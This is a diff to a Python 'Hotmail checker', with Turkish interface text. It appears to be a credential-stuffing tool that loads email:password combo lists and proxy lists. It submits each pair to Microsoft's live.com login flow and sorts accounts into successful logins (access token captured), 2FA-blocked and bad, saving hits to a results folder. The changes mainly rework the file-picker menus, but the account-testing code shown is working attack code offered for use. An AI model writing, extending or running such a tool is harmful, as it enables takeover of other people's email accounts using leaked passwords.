@@ -1,6 +1,6 @@
-# NIXLY HOTMAIL CHECKER TOOL v1.2 (GUI Combo Selector - Full Code)
+# NIXLY HOTMAIL CHECKER TOOL v1.2
 # Hotmail/Outlook/Live checker - Ultra hizli | Full Capture
-# Kullanim: python3 nixly_hotmail1.2v_gui.py
+# Kullanim: python3 nixly_hotmail_tool.py
 # Requirements: pip install requests urllib3
 
 import os
@@ -45,14 +45,15 @@ def banner():
     print()
     print(f"{CY}{'=' * 72}{R}")
     print(f"{Y}  NIXLY HOTMAIL CHECKER TOOL v{VERSION}{R}")
-    print(f"{Y}  Hotmail / Outlook / Live | Açılır Pencere Combo Seçimi{R}")
+    print(f"{Y}  Hotmail / Outlook / Live | Proxy | Result | GUI Seçim{R}")
     print(f"{CY}{'=' * 72}{R}")
     print()
     print(f"{G}  [+] Hotmail / Outlook / Live{R}")
     print(f"{G}  [+] RPS login (Xbox OAuth){R}")
-    print(f"{G}  [+] Açılır pencere ile kolay combo seçimi{R}")
-    print(f"{G}  [+] Proxy desteği{R}")
-    print(f"{G}  [+] Sonuçlar result/ klasörüne kaydedilir{R}")
+    print(f"{G}  [+] A-Shell uyumlu (max {MAX_THREADS} thread){R}")
+    print(f"{G}  [+] Açılır pencere ile kombo seçimi{R}")
+    print(f"{G}  [+] Proxy destegi{R}")
+    print(f"{G}  [+] Sonuclar result/ klasorune{R}")
     print()
     print(f"{CY}{'=' * 72}{R}")
     print(f"{M}  Powered by NIXLY{R}")
@@ -85,29 +86,52 @@ def normalize_combo(line):
     return None
 
 
-def ask_combo_source_gui():
-    """Açılır pencere (file dialog) kullanarak kombo dosyası seçtirir."""
-    log("[~]", "Dosya seçim penceresi açılıyor...", CY)
-    try:
-        root = tk.Tk()
-        root.withdraw()
-        root.attributes("-topmost", True)
-        
-        file_path = filedialog.askopenfilename(
-            title="Kombo Dosyasını Seçin (.txt)",
-            filetypes=[("Metin Dosyaları", "*.txt"), ("Tüm Dosyalar", "*.*")]
-        )
-        
-        root.destroy()
-        
-        if file_path:
-            return file_path
-        else:
-            log("[!]", "Dosya seçimi iptal edildi.", RD)
+def ask_combo_source():
+    print(f"{CY}COMBO KAYNAGI{R}")
+    print(f"  {Y}[1]{R} Açılır pencere ile dosya seç (.txt)")
+    print(f"  {Y}[2]{R} Belirli dosya yolu gir")
+    print()
+    while True:
+        try:
+            choice = input(f"{CY}Secim (1/2): {R}").strip()
+        except (EOFError, KeyboardInterrupt):
+            print()
             return None
-    except Exception as e:
-        log("[!]", f"Açılır pencere hatası: {e}", RD)
-        return None
+        if choice == "1":
+            log("[~]", "Dosya seçim penceresi açılıyor...", CY)
+            try:
+                root = tk.Tk()
+                root.withdraw()
+                root.attributes("-topmost", True)
+                path = filedialog.askopenfilename(
+                    title="Kombo Dosyasını Seçin (.txt)",
+                    filetypes=[("Metin Dosyaları", "*.txt"), ("Tüm Dosyalar", "*.*")]
+                )
+                root.destroy()
+            except Exception as e:
+                log("[!]", f"Açılır pencere hatası: {e}", RD)
+                path = ""
+
+            if not path:
+                log("[!]", "Dosya seçimi iptal edildi", RD)
+                return None
+            if not os.path.isfile(path):
+                log("[!]", f"Dosya bulunamadi: {path}", RD)
+                return None
+            return path
+        elif choice == "2":
+            try:
+                path = input(f"{CY}Dosya yolu: {R}").strip().strip('"').strip("'")
+            except (EOFError, KeyboardInterrupt):
+                return None
+            if not path:
+                return None
+            if not os.path.isfile(path):
+                log("[!]", f"Dosya bulunamadi: {path}", RD)
+                return None
+            return path
+        else:
+            log("[!]", "1 veya 2 gir", RD)
 
 
 def ask_proxy():
@@ -124,22 +148,32 @@ def ask_proxy():
         if choice == "2":
             return []
         if choice == "1":
-            try:
-                root = tk.Tk()
-                root.withdraw()
-                root.attributes("-topmost", True)
-                path = filedialog.askopenfilename(
-                    title="Proxy Dosyasını Seçin (.txt)",
-                    filetypes=[("Metin Dosyaları", "*.txt"), ("Tüm Dosyalar", "*.*")]
-                )
-                root.destroy()
-            except Exception:
-                path = ""
+            print(f"  {Y}[1]{R} Açılır pencere ile proxy dosyası seç")
+            print(f"  {Y}[2]{R} Manuel dosya yolu yaz")
+            sub_choice = input(f"{CY}Seçim (1/2): {R}").strip()
+            
+            path = ""
+            if sub_choice == "1":
+                try:
+                    root = tk.Tk()
+                    root.withdraw()
+                    root.attributes("-topmost", True)
+                    path = filedialog.askopenfilename(
+                        title="Proxy Dosyasını Seçin (.txt)",
+                        filetypes=[("Metin Dosyaları", "*.txt"), ("Tüm Dosyalar", "*.*")]
+                    )
+                    root.destroy()
+                except Exception:
+                    path = ""
+            else:
+                try:
+                    path = input(f"{CY}Proxy dosya yolu: {R}").strip().strip('"').strip("'")
+                except (EOFError, KeyboardInterrupt):
+                    return []
 
             if not path or not os.path.isfile(path):
-                log("[!]", "Proxy dosyası seçilmedi veya bulunamadı.", RD)
+                log("[!]", f"Proxy dosyasi bulunamadi: {path}", RD)
                 continue
-                
             proxies = []
             with open(path, "r", encoding="utf-8", errors="ignore") as f:
                 for line in f:
@@ -147,10 +181,12 @@ def ask_proxy():
                     if line and not line.startswith("#"):
                         proxies.append(line)
             if not proxies:
-                log("[!]", "Proxy listesi boş", RD)
+                log("[!]", "Proxy listesi bos", RD)
                 continue
             log("[+]", f"{len(proxies)} proxy yuklendi", G)
             return proxies
+        else:
+            log("[!]", "1 veya 2 gir", RD)
 
 
 def format_proxy(p):
@@ -228,11 +264,13 @@ class HotmailChecker:
                 r = self.session.post(urlPost, data=data, allow_redirects=True,
                                       timeout=self.timeout)
 
+                # Basarili giris
                 if "#" in r.url and r.url != self.url:
                     token = parse_qs(urlparse(r.url).fragment).get("access_token", ["None"])[0]
                     if token != "None":
                         return "SUCCESS"
 
+                # Cancel flow (dogrulama kaldi)
                 if "cancel?mkt=" in r.text:
                     try:
                         ipt = re.search(r'(?<="ipt" value=").+?(?=">)', r.text)
@@ -259,11 +297,13 @@ class HotmailChecker:
                     except Exception:
                         pass
 
+                # 2FA
                 if any(v in r.text for v in [
                     "recover?mkt", "account.live.com/identity/confirm?mkt",
                     "Email/Confirm?mkt", "/Abuse?mkt="]):
                     return "2FA"
 
+                # Bad
                 if any(v in r.text.lower() for v in [
                     "password is incorrect",
                     "account doesn't exist",
@@ -393,9 +433,9 @@ def run_checker(accounts, proxies, threads):
 def main():
     banner()
 
-    combo_path = ask_combo_source_gui()
+    combo_path = ask_combo_source()
     if not combo_path:
-        log("[!]", "Kombo dosyası seçilmediği için işlem sonlandırıldı.", RD)
+        log("[!]", "Combo kaynagi secilmedi", RD)
         return
 
     print()
